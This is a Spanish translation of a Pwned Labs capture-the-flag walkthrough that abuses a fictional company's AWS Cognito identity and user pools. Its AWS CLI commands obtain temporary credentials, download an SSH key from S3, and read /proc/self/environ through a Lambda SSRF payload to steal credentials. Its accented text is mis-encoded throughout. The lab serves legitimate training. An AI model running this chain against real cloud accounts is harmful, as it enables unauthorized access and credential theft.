---
title: Abuso de Identity Pools y usuarios de Cognito
description: PWNED LABS
date: 2024-08-29
---

<Callout>
Este es el [LINK](https://pwnedlabs.io/labs/abuse-cognito-user-and-identity-pools) al laboratorio.
</Callout>

<Callout>
El contenido de este post es el mismo que el de Pwned Labs traducido al castellano.
</Callout>

## Escenario

Durante un pentest de seguridad externo de rutina en Huge Logistics, su equipo se top贸 con un repositorio p煤blico de git. No era un repositorio cualquiera; conten铆a el c贸digo fuente completo  de su nueva aplicaci贸n para Android. Podr铆a ser simplemente el punto de entrada que necesita para acceder al entorno de nube m谩s amplio de la empresa. El desaf铆o ahora es examinar las
complejidades de la aplicaci贸n, identificar vulnerabilidades potenciales y ver si estas migas de pan conducen m谩s profundamente al 谩mbito digital de Huge Logistics.  El per铆metro es tu l铆nea de partida; 驴Hasta d贸nde puedes llegar?

## Lo que aprenderas

- Explotar configuraciones permisivas en Identity Pools y usuarios de Amazon Cognito
- Ser capaz de identificar vulnerabilidades al revisar el c贸digo fuente.
- Explotar una funci贸n Lambda
- Comprender c贸mo se podr铆a haber evitado esta cadena de exploits

## Realidad

Las configuraciones incorrectas o los ajustes permisivos en los grupos de identidades y usuarios
de AWS Cognito pueden permitir el acceso a recursos a los que no se deber铆a acceder y pueden dar
lugar a que actores malintencionados puedan moverse lateral y verticalmente dentro de un
entorno de nube. La [investigaci贸n realizada en 2019](https://andresriancho.com/wp-content/uploads/2019/06/whitepaper-internet-scale-analysis-of-aws-cognito-security.pdf)
por Andr茅s Riancho identific贸 2500 grupos de identidades de Cognito, que se utilizaron para
obtener acceso a m谩s de 13000 dep贸sitos S3 (que no est谩n expuestos p煤blicamente), 1200 tablas
de DynamoDB y 1500 funciones Lambda.

## Tutorial

Al utilizar Amazon Cognito, los desarrolladores pueden centrarse en la experiencia de la
aplicaci贸n en lugar de preocuparse por crear, proteger y escalar una soluci贸n para manejar
la administraci贸n de usuarios, la autenticaci贸n y la sincronizaci贸n entre dispositivos.
Cognito consta principalmente de dos servicios principales:**User Pools** y **Federated
Identities (Identity Pools)**.

<Image
src="/images/blog/image.png"
width="748"
height="404"
alt="Image"
/>

1. El cliente se autentica en un grupo de usuarios.
2. El grupo de usuarios asigna tres tokens web JSON (JWT) a (Id, access y refresh).
3. El ID JWT se pasa al grupo de identidades y se elige una funci贸n a trav茅s de las
notificaciones JWT. Luego, el usuario recibe credenciales de IAM temporales con privilegios
que se basan en la funci贸n de IAM asignada al grupo al que pertenece ese usuario.
4. Luego, el usuario puede realizar llamadas a recursos de AWS seg煤n sus privilegios.

## Ataque

### Identity Pools

Al inspeccionar el c贸digo fuente filtrado, vemos una importaci贸n para `com.amazonaws.auth.CognitoCachingCredentialsProvider`.
Amazon Cognito es un servicio proporcionado por AWS que ofrece registro de usuario, inicio de sesi贸n y control de acceso
simple y seguro a aplicaciones web y m贸viles. Se adapta a millones de usuarios y admite el inicio de sesi贸n con cuentas
de redes sociales como Facebook, Google y Amazon, e identidades empresariales a trav茅s de SAML 2.0.
Tambi茅n vemos un ID de grupo de identidades de Cognito, as铆 como una referencia a un dep贸sito de S3 llamado hl-app-images .

<br/>

<Image
src="/images/blog/cognito12.png"
width="748"
height="404"
alt="Image"
/>

<Image
src="/images/blog/cognito13.png"
width="748"
height="404"
alt="Image"
/>

Amazon Cognito se puede configurar para admitir identidades no autenticadas, emitiendo credenciales de AWS
de corta duraci贸n para los usuarios que no se autentican con un proveedor de identidad, siempre que el solicitante
tenga un ID de identidad 煤nico v谩lido. Podemos intentar solicitar una ID de identidad 煤nica proporcionando la ID
del grupo de identidades del c贸digo fuente.

<Callout>
Nota : Debe autenticarse con sus propias credenciales personales de AWS y
configurar la regi贸n en us-east-1 ya que es regi贸n es la que esta en el c贸digo.
</Callout>

```js
aws cognito-identity get-id --identity-pool-id 
us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --no-sign
```

- `aws cognito-identity get-id`: Este es el comando base de la AWS CLI para solicitar un ID de identidad de un
grupo de identidades en Amazon Cognito. Espec铆ficamente, get-id es una operaci贸n que devuelve un ID de identidad
煤nico para un usuario autenticado o no autenticado en el grupo de identidades especificado.
- `-identity-pool-id`: es una opci贸n obligatoria que especifica el ID del grupo de identidades de Cognito.
- `us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367`: El valor us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 es el
ID del grupo de identidades, que sigue el formato de region:GUID (en este caso, us-east-1 es la regi贸n,
y el GUID es un identificador 煤nico del pool).
- `-no-sign`: Esta opci贸n le indica a AWS CLI que no firme la solicitud con credenciales de AWS.
Esto puede ser 煤til en situaciones donde no es necesario autenticar la solicitud, como cuando se solicita un
ID para un usuario no autenticado o cuando se realiza una prueba.

<Image
src="/images/blog/cognito1.png"
width="748"
height="404"
alt="Image"
/>

Tenemos una identificaci贸n de identidad. Solicitemos las credenciales para ello.

```js
aws cognito-identity get-credentials-for-identity 
--identity-id us-east-1:6391d33c-4b30-c088-b6fa-ae981fc516ae
--no-sign --region us-east-1
```

- `get-credentials-for-identity`: Este comando de AWS CLI solicita credenciales temporales para un usuario espec铆fico,
representado por un ID de identidad (identity-id) en un grupo de identidades de Amazon Cognito.

<Image
src="/images/blog/cognito2.png"
width="748"
height="404"
alt="Image"
/>

Tenemos credenciales, veamos si podemos ampliar nuestro acceso. Primero configure las key con aws configure y
luego configure el token con aws configure set aws_session_token `<token>`.
El comando `aws sts get-caller-identity` revela que hemos asumido el rol denominado `Cognito_StatusAppUnauth_Role` .

<br/>

<Image
src="/images/blog/cognito4.png"
width="748"
height="404"
alt="Image"
/>

<br/>

<Image
src="/images/blog/cognito5.png"
width="748"
height="404"
alt="Image"
/>

```js
aws sts get-caller-identity
```

- `aws sts get-caller-identity` se utiliza para obtener informaci贸n sobre la identidad del usuario o rol que est谩 ejecutando el comando. Es una forma de verificar qui茅n es el usuario autenticado actualmente en AWS (Amazon Web Services). Es como el `whoami` de Cognito.

<Image
src="/images/blog/cognito14.png"
width="748"
height="404"
alt="Image"
/>

Podemos intentar ejecutar la automatizaci贸n del proceso de enumeraci贸n de nuestros permisos en la cuenta de AWS utilizando [una herramienta como aws-enumerator](https://github.com/shabarkin/aws-enumerator) , pero esto no tiene 茅xito. Recordamos el dep贸sito de S3 al que se hace referencia en el c贸digo fuente y lo enumeramos.

```js
aws s3 ls hl-app-images
aws s3 ls hl-app-images/temp/
aws s3 cp s3://hl-app-images/temp/id_rsa .
```

<Image
src="/images/blog/cognito7.png"
width="748"
height="404"
alt="Image"
/>

隆Esto revela una clave SSH! Con esta clave podemos intentar enumerar instancias EC2 u otros hosts identificados en la infraestructura de Huge Logistics e intentar ampliar nuestro acceso.

## Grupos de Usuarios (Users Pool)

Su equipo tambi茅n identific贸 una interfaz de usuario alojada en Cognito expuesta p煤blicamente para una aplicaci贸n web asociada con un grupo de usuarios de Cognito. La URL (as铆 como el formulario) hace referencia al ID del cliente. `16f1g98bfuj9i0g3f8be36kkrl` .

https://huge-logistics.auth.us-east-1.amazoncognito.com/login?client_id=16f1g98bfuj9i0g3f8be36kkrl&response_type=code&scope=https%3A%2F%2Fapi.huge-logistics.com%2Fstatus+openid&redirect_uri=https%3A%2F%2Fhuge-logistics.com

<br/>

<Image
src="/images/blog/cognito8.png"
width="748"
height="404"
alt="Image"
/>

Podemos inferir del formulario de registro que el grupo de usuarios se ha configurado para aceptar el inicio de sesi贸n con un nombre de usuario, por lo que sabemos que este es un atributo obligatorio al registrarse. Despu茅s de revisar [la documentaci贸n de AWS](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/sign-up.html) para sign-up En esta acci贸n ingresamos los siguientes comandos, que se ejecutan correctamente una vez que cumplimos con la pol铆tica de contrase帽a configurada.


```js
aws cognito-idp sign-up 
  --client-id 16f1g98bfuj9i0g3f8be36kkrl 
  --username test --password 'Password123!'
```
<br/>

<Image
src="/images/blog/cognito9.png"
width="748"
height="404"
alt="Image"
/>

<br/>

<Image
src="/images/blog/cognito10.png"
width="748"
height="404"
alt="Image"
/>

Despu茅s de revisar la documentaci贸n para la acci贸n de inicio de autenticaci贸n, podemos emitir el siguiente comando para obtener un token web JSON (JWT). Sin embargo, esto no tiene 茅xito ya que los usuarios del grupo de usuarios de Cognito deben ser confirmados.

```js
aws cognito-idp initiate-auth 
--client-id 16f1g98bfuj9i0g3f8be36kkrl
--auth-flow USER_PASSWORD_AUTH 
--auth-parameters USERNAME=test,PASSWORD=Password123!
```

<Image
src="/images/blog/cognito15.png"
width="748"
height="404"
alt="Image"
/>

En caso de que la configuraci贸n recomendada por AWS de "Permitir que Cognito env铆e mensajes autom谩ticamente para verificar y confirmar" est茅 configurada, podemos intentar especificar un correo electr贸nico al que Cognito enviar谩 autom谩ticamente un c贸digo de verificaci贸n. 

```js
aws cognito-idp sign-up 
--client-id 16f1g98bfuj9i0g3f8be36kkrl 
--username p314d01
--password Password123! 
--user-attributes Name="email",Value="<email>" Name="name",Value="Test"
```

<Image
src="/images/blog/cognito16.png"
width="748"
height="404"
alt="Image"
/>

Se acept贸 el registro de este nuevo usuario y recibimos un c贸digo de verificaci贸n. 

<Image
src="/images/blog/cognito17.png"
width="748"
height="404"
alt="Image"
/>

Podemos crear el siguiente comando para proporcionar el c贸digo y confirmar nuestra cuenta. Ejecutar este comando no se devuelve ning煤n resultado.

<Callout>
Nota : Deber谩 especificar un usuario 煤nico. 
</Callout>

```js
aws cognito-idp confirm-sign-up 
--client-id 16f1g98bfuj9i0g3f8be36kkrl 
--username test_user 
--confirmation-code 390494
```

Esta vez el initiate-auth 隆La acci贸n es exitosa y obtenemos un JWT v谩lido! Puede inspeccionar el JWT y decodificar los valores de los tokens individuales utilizando el sitio web https://jwt.io/ . 

```js 
aws cognito-idp initiate-auth 
--client-id 16f1g98bfuj9i0g3f8be36kkrl 
--auth-flow USER_PASSWORD_AUTH 
--auth-parameters USERNAME=p314do1,PASSWORD=Password123!
```

<Image
src="/images/blog/cognito18.png"
width="748"
height="404"
alt="Image"
/>

Los JWT se componen de JSON codificado en URL base64. Una estructura JSON comienza con `{`, que se traduce como "ey" cuando se codifica en base64. El encabezado JWT normalmente (aunque no siempre) comienza con `{"alg":...`, que luego se convierte en "eyJ" cuando se codifica.

Al decodificar el token de acceso en https://jwt.io vemos que iss (emisor de token) est谩 configurado en https://cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz . Este es el ID del grupo de usuarios, con `8rcK7abtz` siendo un identificador 煤nico a nivel mundial. 

<Image
src="/images/blog/cognito19.png"
width="748"
height="404"
alt="Image"
/>

La emisi贸n de JWT para usuarios autenticados en Amazon Cognito ofrece numerosas ventajas, incluidos flujos de trabajo de autenticaci贸n y autorizaci贸n simplificados, escalabilidad, interoperabilidad con otros marcos y aplicaciones, y seguridad mejorada. Podemos utilizar este token para solicitar credenciales de AWS.

Emita el siguiente comando que especifica el get-id acci贸n, copiando el token de acceso de IdToken y especificando el ID del grupo de usuarios. 

```js
aws cognito-identity get-id 
--identity-pool-id "us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367" 
--logins 
"{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<token>\" }"
```
<Image
src="/images/blog/cognito21.png"
width="748"
height="404"
alt="Image"
/>

<br />

<Image
src="/images/blog/cognito20.png"
width="748"
height="404"
alt="Image"
/>

Esto es exitoso y obtenemos la identificaci贸n de identidad 煤nica. `us-east-1:6391d33c-4ba1-c122-bc29-e1f3a70921dd`.

<Callout>
Nota : el ID de identidad en su instancia de laboratorio ser谩 diferente.
</Callout>

Ahora ejecute este comando que especifica el `get-credentials-for-identity` acci贸n y el identificador 煤nico.

```js 
aws cognito-identity get-credentials-for-identity 
--identity-id us-east-1:ee941406-f70b-4ff3-8e3f-a9f2eb32454b 
--logins 
"{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<token>\" }"
```
<Image
src="/images/blog/cognito23.png"
width="748"
height="404"
alt="Image"
/>

<Image
src="/images/blog/cognito22.png"
width="748"
height="404"
alt="Image"
/>

隆Obtenemos credenciales de AWS! despues de correr aws configure para configurar las claves y aws configure set aws_session_token `<token>` para establecer el token, descubrimos que hemos asumido el rol Cognito_StatusAppAuth_Role. El rol que hab铆amos asumido anteriormente era Cognito_StatusAppNoauth_Role, 驴tal vez tengamos m谩s permisos ahora? 

<Image
src="/images/blog/cognito25.png"
width="748"
height="404"
alt="Image"
/>

```js 
aws sts get-caller-identity
```

<Image
src="/images/blog/cognito26.png"
width="748"
height="404"
alt="Image"
/>

Al ejecutar el siguiente comando, vemos una pol铆tica predeterminada administrada por AWS asociada con el rol. 

```js 
aws iam list-role-policies 
--role-name Cognito_StatusAppAuth_Role
```

<Image
src="/images/blog/cognito27.png"
width="748"
height="404"
alt="Image"
/>

Al enumerar las pol铆ticas de roles adjuntas (administradas por el cliente), vemos que el rol denominado Status est谩 adjunto. 

```js 
aws iam list-attached-role-policies 
--role-name Cognito_StatusAppAuth_Role
```

<Image
src="/images/blog/cognito28.png"
width="748"
height="404"
alt="Image"
/>

Profundicemos. La ejecuci贸n del siguiente comando nos proporciona la versi贸n de la pol铆tica. 

```js 
aws iam get-policy 
--policy-arn arn:aws:iam::427648302155:policy/Status
```

<Image
src="/images/blog/cognito29.png"
width="748"
height="404"
alt="Image"
/>

Ahora ingrese este comando para recuperar el documento de pol铆tica JSON.

```js 
aws iam get-policy-version 
--policy-arn arn:aws:iam::427648302155:policy/Status 
--version-id v4
```

Esto es interesante porque parece que tenemos permisos para enumerar todas las funciones de Lambda en la cuenta y tambi茅n podemos recuperar el c贸digo de la funci贸n e invocarlo.

<Image
src="/images/blog/cognito30.png"
width="748"
height="404"
alt="Image"
/>

Ya tenemos un nombre de funci贸n pero podemos recuperar m谩s informaci贸n sobre las funciones disponibles con aws lambda list-functions. 

<Image
src="/images/blog/cognito31.png"
width="748"
height="404"
alt="Image"
/>

Sigamos enumerando `huge-logistics-status`.

```js
aws lambda get-function --function-name huge-logistics-status
```

<Image
src="/images/blog/cognito32.png"
width="748"
height="404"
alt="Image"
/>

Esto revela la configuraci贸n de la funci贸n a continuaci贸n, incluida la URL del paquete zip que contiene el c贸digo de la funci贸n.

```js
wget 'URL' -O huge-logistics-status.zip
```

Despu茅s de descomprimirlo vemos el c贸digo Python a continuaci贸n. El prop贸sito de la funci贸n es verificar el estado de http://huge-logistics.com . Interesante desde una perspectiva de seguridad es que podemos invocar esta funci贸n Lambda con un event argumento que contiene una clave 'objetivo', estableciendo el target variable al valor asociado. Si 'objetivo' no est谩 en el diccionario de eventos, target se establecer谩 en 'http://huge-logistics.com' por defecto. 


<Image
src="/images/blog/cognito33.png"
width="748"
height="404"
alt="Image"
/>

Esta funci贸n Lambda sufre vulnerabilidades de falsificaci贸n de solicitudes del lado del servidor (SSRF) y lectura arbitraria de archivos porque no se realiza ninguna validaci贸n en el par谩metro target para garantizar que sea seguro y no un recurso interno. SSRF puede ser una vulnerabilidad m谩s peligrosa si el servidor web es una instancia EC2; sin embargo, en este caso es un Lambda. Para leer archivos arbitrarios necesitar铆amos especificar el file:// Esquema de URL. 

Primero invoquemos la funci贸n con el valor predeterminado.

```js 
aws lambda invoke --function-name huge-logistics-status response.json
```

<Image
src="/images/blog/cognito34.png"
width="748"
height="404"
alt="Image"
/>

Podemos validar la vulnerabilidad SSRF especificando otra URL.

```js
aws lambda invoke 
--function-name huge-logistics-status 
--payload '{ "target": "http://example.com" }' response.json
```


<Callout>
 Si est谩 utilizando la versi贸n 2 de AWS CLI, es posible que reciba el error Invalid base64: `{ "target": "http://example.com" }` al ejecutar este comando. En este caso, necesita codificar en base64 la carga 煤til con el par谩metro --cli-binary-format raw-in-base64-out. El comando v2 completo se encuentra a continuaci贸n. Utilice este formato para las siguientes invocaciones de Lambda. 
</Callout>

```js
aws lambda invoke 
--cli-binary-format raw-in-base64-out 
--function-name huge-logistics-status 
--payload '{ "target": "http://example.com" }' response.json
```

<Image
src="/images/blog/cognito36.png"
width="748"
height="404"
alt="Image"
/>

Ahora intentemos explotar el archivo arbitrario le铆do. Una buena opci贸n para nosotros en el contexto de AWS Lambda es /proc/self/environ ya que este archivo almacena variables de entorno, incluidas las credenciales de AWS utilizadas por la funci贸n.


```js
aws lambda invoke
--cli-binary-format raw-in-base64-out 
--function-name huge-logistics-status 
--payload '{ "target": "file:///proc/self/environ" }' response.json
```

<Image
src="/images/blog/cognito37.png"
width="748"
height="404"
alt="Image"
/>

Configure nuevamente las nuevas claves y el token. `aws sts get-caller-identity` revela nuestro nuevo contexto de ejecuci贸n. 

<Image
src="/images/blog/cognito38.png"
width="748"
height="404"
alt="Image"
/>

Dado que el dep贸sito S3 estaba en el c贸digo de funci贸n, comencemos por ah铆. La enumeraci贸n del dep贸sito revela una carpeta temporal que contiene el plan de recuperaci贸n ante desastres de AWS para Huge Logistics.

<Image
src="/images/blog/cognito39.png"
width="748"
height="404"
alt="Image"
/>

<br/>

<Image
src="/images/blog/cognito40.png"
width="748"
height="404"
alt="Image"
/>

<br/>

<Image
src="/images/blog/cognito41.png"
width="748"
height="404"
alt="Image"
/>

Incluye la cuenta cr铆tica de rotura de vidrio que permite el acceso a una cuenta de repuesto din谩mico de AWS.

<Image
src="/images/blog/cognito42.png"
width="748"
height="404"
alt="Image"
/>

## Referencias

- [Flickr Account Takeover](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/)
- [Dow Jones Data Leak Results from an AWS Configuration Error](https://www.darkreading.com/cloud-security/dow-jones-data-leak-results-from-an-aws-configuration-error)
- [Internet-Scale analysis of AWS Cognito Security](https://andresriancho.com/wp-content/uploads/2019/06/whitepaper-internet-scale-analysis-of-aws-cognito-security.pdf)